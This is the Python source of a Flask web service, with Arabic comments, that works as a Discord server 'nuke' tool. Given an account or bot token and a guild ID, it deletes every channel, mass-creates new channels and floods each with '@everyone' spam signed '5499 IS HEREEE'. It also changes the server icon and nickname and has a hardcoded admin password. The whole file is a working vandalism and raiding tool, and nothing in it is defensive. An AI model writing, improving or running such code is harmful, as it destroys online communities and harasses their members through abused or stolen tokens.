from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import requests
import base64

app = Flask(__name__)
CORS(app)

def run_logic(headers, guild_id, cmd, data, is_admin):
    # --- [ وضع الإدارة - بصمة 5499 ] ---
    if is_admin or cmd == "admin_nuke":
        name = "5499 is heree"
        msg = "5499 IS HEREEE @everyone"
        count = 100
        # تغيير اللقب للكل بصيغة إجبارية
        threading.Thread(target=lambda: requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=headers, json={"nick": "5499 IS HEREEE"})).start()
    
    # --- [ الوضع العادي - اختياري ] ---
    else:
        name = data.get('name') or "AL-KUWAITI"
        msg = data.get('msg') or "@everyone"
        count = int(data.get('count') or 50)
        icon = data.get('icon')
        if icon:
            try:
                img = base64.b64encode(requests.get(icon).content).decode()
                requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json={"icon": f"data:image/png;base64,{img}"})
            except: pass

    # تنفيذ الحذف والسبام
    if cmd in ["admin_nuke", "full_nuke", "del_ch"]:
        ch_list = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
        for ch in ch_list: threading.Thread(target=lambda cid=ch['id']: requests.delete(f"https://discord.com/api/v9/channels/{cid}", headers=headers)).start()

    if cmd in ["admin_nuke", "full_nuke"]:
        for _ in range(min(count, 100)):
            def spam():
                res = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json={"name": name, "type": 0}).json()
                if 'id' in res:
                    for _ in range(10): requests.post(f"https://discord.com/api/v9/channels/{res['id']}/messages", headers=headers, json={"content": msg})
            threading.Thread(target=spam).start()

@app.route('/execute', methods=['POST'])
def execute():
    d = request.json
    is_admin = (d.get('password') == "kuwaiti#5499")
    headers = {"Authorization": d['token']}
    if requests.get("https://discord.com/api/v9/users/@me", headers=headers).status_code != 200:
        headers = {"Authorization": f"Bot {d['token']}"}
    
    threading.Thread(target=run_logic, args=(headers, d['guild'], d['command'], d, is_admin)).start()
    return jsonify({"status": "processing"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
